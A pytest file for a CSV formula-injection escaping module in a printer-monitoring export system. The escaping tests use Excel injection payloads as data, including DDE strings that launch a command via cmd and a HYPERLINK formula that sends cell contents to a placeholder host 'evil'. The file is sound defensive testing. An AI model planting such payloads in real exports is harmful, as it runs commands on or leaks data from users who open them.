"""CSV formula-injection escaping.

Every string in this system's exports can originate on a printer: model names,
locations and prtAlertDescription text arrive over SNMP from devices on
customer LANs. An MSP opens those exports in Excel, and a cell whose first
character is "=", "+", "-", "@", TAB or CR is evaluated there rather than
displayed. RFC 4180 quoting does not help -- the quotes are consumed by the CSV
parser before the spreadsheet sees the value.
"""

from __future__ import annotations

import csv
import io

import pytest

from central.csv_safe import ESCAPE, is_risky, safe_writer, sanitize_cell


# --------------------------------------------------------------------------- #
# The trigger set
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("payload", [
    "=1+1",
    '=cmd|\' /C calc\'!A0',
    '=HYPERLINK("http://evil/?x="&A1,"click")',
    "+1+1",
    "@SUM(A1:A9)",
    "-1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    # Leading whitespace: importers disagree about whether they trim before
    # deciding, so a value that is a formula under EITHER reading is risky.
    "  =1+1",
])
def test_formula_payloads_are_escaped(payload):
    assert is_risky(payload) is True
    out = sanitize_cell(payload)
    assert out == ESCAPE + payload
    # The payload survives intact behind the marker -- this neutralizes, it
    # does not silently discard the operator's data.
    assert out[1:] == payload


@pytest.mark.parametrize("value", [
    "HP LaserJet M404",
    "Brother MFC-L8900CDW",
    "Floor 2 · East wing",
    "FW3.21",
    "",
    "cleartext",
    "2c",
])
def test_ordinary_values_pass_through_untouched(value):
    assert is_risky(value) is False
    assert sanitize_cell(value) == value


# --------------------------------------------------------------------------- #
# The carve-out that keeps the exports usable
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("value", ["-1", "-12.5", "+3", "1e-9", "-1E+9", ".5", "-.5"])
def test_negative_and_signed_numbers_are_not_mangled(value):
    """Page counts, deltas and levels are what these exports exist for, and a
    negative number starts with "-". Escaping those would turn every one of
    them into text and break the arithmetic in the spreadsheet an operator
    built on the export -- a real cost for no security gain, since a number
    cannot be a formula."""
    assert is_risky(value) is False
    assert sanitize_cell(value) == value


def test_a_non_numeric_string_starting_with_a_sign_is_still_escaped():
    """The carve-out is for numbers, not for the "-" character."""
    assert sanitize_cell("-1+cmd|' /C calc'!A0") == ESCAPE + "-1+cmd|' /C calc'!A0"
    assert sanitize_cell("-") == ESCAPE + "-"


# --------------------------------------------------------------------------- #
# Non-strings
# --------------------------------------------------------------------------- #
def test_none_becomes_an_empty_cell_not_the_word_none():
    assert sanitize_cell(None) == ""


@pytest.mark.parametrize("value", [0, -5, 12.5, True, False])
def test_non_strings_pass_through_unchanged(value):
    """Handed back as-is for csv.writer to stringify: none can carry a formula,
    and round-tripping through str() here would only risk reformatting them."""
    assert sanitize_cell(value) is value


# --------------------------------------------------------------------------- #
# The writer
# --------------------------------------------------------------------------- #
def test_safe_writer_escapes_every_cell_of_every_row():
    buf = io.StringIO()
    writer = safe_writer(buf)
    writer.writerow(["ip", "model", "pages"])
    writer.writerows([
        ["10.0.0.1", "=1+1", -5],
        ["10.0.0.2", "HP M404", 120],
    ])
    rows = list(csv.reader(io.StringIO(buf.getvalue())))
    assert rows[0] == ["ip", "model", "pages"]
    assert rows[1] == ["10.0.0.1", "'=1+1", "-5"]
    assert rows[2] == ["10.0.0.2", "HP M404", "120"]


def test_safe_writer_still_gets_rfc4180_quoting_right():
    """csv_safe is layered ON csv.writer, not a replacement for it: quoting is
    a parsing problem and escaping is a rendering problem, and the file needs
    both solved."""
    buf = io.StringIO()
    safe_writer(buf).writerow(['a,b', 'say "hi"', "line1\nline2"])
    assert list(csv.reader(io.StringIO(buf.getvalue()))) == [
        ["a,b", 'say "hi"', "line1\nline2"],
    ]


def test_safe_writer_accepts_csv_writer_kwargs():
    buf = io.StringIO()
    safe_writer(buf, delimiter=";").writerow(["a", "b"])
    assert buf.getvalue().startswith("a;b")


def test_escaping_survives_a_round_trip_through_a_reader():
    """The escape is for the spreadsheet, not the parser: a CSV reader gets the
    marker back verbatim, so re-importing is lossy by exactly one character and
    never mis-parses."""
    buf = io.StringIO()
    safe_writer(buf).writerow(["=1+1"])
    assert next(csv.reader(io.StringIO(buf.getvalue()))) == ["'=1+1"]
